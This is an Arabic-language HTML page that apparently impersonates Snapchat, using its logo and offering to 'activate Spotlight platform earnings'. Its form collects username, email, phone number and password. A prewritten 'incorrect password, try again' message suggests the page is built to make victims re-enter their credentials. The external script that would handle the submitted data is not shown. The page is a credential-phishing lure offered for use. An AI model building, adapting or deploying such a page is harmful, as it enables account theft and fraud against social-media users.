<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تفعيل مكاسب منصة الأضواء</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <img src="logo.png" alt="Snapchat Logo" class="logo">
    </header>

    <section class="form-container">
        <h1>تفعيل مكاسب منصة الأضواء</h1>
        <form id="applyForm">
            <input type="text" id="username" placeholder="اسم المستخدم" required>
            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
            <input type="tel" id="phone" placeholder="رقم الهاتف" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit">تفعيل المكاسب</button>
        </form>
        <p id="errorMessage" class="hidden">كلمة المرور غير صحيحة، يرجى إعادة المحاولة</p>
        <p id="successMessage" class="hidden">تم تقديم طلبك</p>
    </section>

    <script src="script.js"></script>
</body>
</html>
